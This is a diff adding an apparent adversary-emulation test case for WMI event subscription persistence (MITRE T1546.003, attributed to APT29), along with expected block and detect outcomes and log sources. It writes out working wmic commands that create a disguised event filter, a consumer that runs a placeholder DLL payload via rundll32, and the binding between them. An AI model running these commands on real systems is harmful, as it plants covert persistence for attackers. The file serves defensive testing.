@@ -1,0 +1,40 @@
+name: Persist via WMI Event Subscription
+description: Establish persistence on a target system by creating a WMI CommandlineEventConsumer
+  event subscription that launches a malicious dll payload with rundll32
+metadata:
+  isv: 1
+  tactic: TA0003
+  tid: T1546.003
+  x_vectr_id: 977e7354-9cbd-4a7f-90b6-d1156c675983
+  groups:
+  - APT29
+platforms:
+- windows
+prerequisites:
+- local_admin
+guidance:
+- cmd> wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="__timeritem",
+  EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent
+  WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime
+  >= 300 AND TargetInstance.SystemUpTime < 4400"
+- cmd> wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE
+  Name="setpolicytrace", ExecutablePath="C:\Windows\System32\rundll32.exe",CommandLineTemplate="C:\Windows\System32\rundll32.exe
+  {{ dll_payload }} {{ dll_export }}"
+- cmd> wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE
+  Filter="__EventFilter.Name=\"__timeritem\"", Consumer="CommandLineEventConsumer.Name=\"setpolicytrace\""
+block:
+- Suspicious process execution/behavior blocked by endpoint security tool
+- Anomalous WMI event filter, consumer, and/or filter to consumer binding creation
+  is blocked by endpoint security tool
+detect:
+- Suspicious process execution/behavior is detected by endpoint security tool or triggers
+  alert in SIEM based on telemetry
+- Anomalous WMI event filter, consumer, and/or filter to consumer binding creation
+  is detected by endpoint security tool or in the SIEM using endpoint security tool
+  telemetry or native windows event ids (ex 5857).
+logs:
+- winevent
+- edr:telemetry
+controls:
+- SIEM
+- Endpoint Protection
